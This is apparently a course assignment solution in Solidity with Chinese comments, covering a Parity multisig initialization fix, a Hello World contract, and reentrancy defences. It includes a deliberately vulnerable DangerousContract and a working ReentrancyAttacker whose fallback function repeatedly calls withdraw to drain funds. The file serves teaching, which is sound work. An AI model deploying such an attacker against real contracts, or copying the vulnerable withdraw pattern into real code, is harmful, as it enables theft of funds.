pragma solidity ^0.4.24;

// 1. Parity多签钱包漏洞修复（对应问题2(b)）
contract FixedParityMultiSig {
    bool public initialized; // 初始化状态标记
    address[] public owners;
    uint public required;
    uint public daylimit;

    function initMultiowned(address[] _owners, uint _required) internal {
        owners = _owners;
        required = _required;
    }

    function initDaylimit(uint _daylimit) internal {
        daylimit = _daylimit;
    }

    // 修复漏洞：添加初始化检查，防止重复调用
    function initWallet(address[] _owners, uint _required, uint _daylimit) public {
        require(!initialized, "Already initialized");
        initMultiowned(_owners, _required);
        initDaylimit(_daylimit);
        initialized = true;
    }
}

// 2. Hello World合约（对应问题5(d)）
contract HelloWorld {
    function sayHello() public pure returns (string memory) {
        return "Hello, world!";
    }
}

// 3. 重入攻击相关合约（对应问题6(d)）
contract DangerousContract {
    mapping(address => uint) public deposits;

    function depositMoney() public payable {
        deposits[msg.sender] += msg.value;
    }

    // 存在重入漏洞：先转账后更新状态
    function withdraw(uint amount) public {
        require(deposits[msg.sender] >= amount, "Insufficient balance");
        if (!msg.sender.call.value(amount)()) {
            revert("Transfer failed");
        }
        deposits[msg.sender] -= amount;
    }
}

contract ReentrancyAttacker {
    DangerousContract public target;

    constructor(address _targetAddr) public {
        target = DangerousContract(_targetAddr);
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH to attack");
        target.depositMoney.value(1 ether)();
        target.withdraw(1 ether);
    }

    // Fallback函数：重入调用withdraw
    function () external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
}

// 4. 重入攻击防御合约（对应问题6(e)）
contract SafeWithdraw1 {
    mapping(address => uint) public deposits;

    // 防御方法：检查-效果-交互（先更新状态再转账）
    function withdraw(uint amount) public {
        require(deposits[msg.sender] >= amount, "Insufficient balance");
        deposits[msg.sender] -= amount; // 先更新状态
        if (!msg.sender.call.value(amount)()) {
            revert("Transfer failed");
        }
    }

    function depositMoney() public payable {
        deposits[msg.sender] += msg.value;
    }
}

contract SafeWithdraw2 {
    mapping(address => uint) public deposits;
    bool private locked; // 重入锁

    // 防御方法：重入锁
    function withdraw(uint amount) public {
        require(!locked, "Reentrancy detected");
        locked = true;

        require(deposits[msg.sender] >= amount, "Insufficient balance");
        if (!msg.sender.call.value(amount)()) {
            revert("Transfer failed");
        }
        deposits[msg.sender] -= amount;

        locked = false;
    }

    function depositMoney() public payable {
        deposits[msg.sender] += msg.value;
    }
}
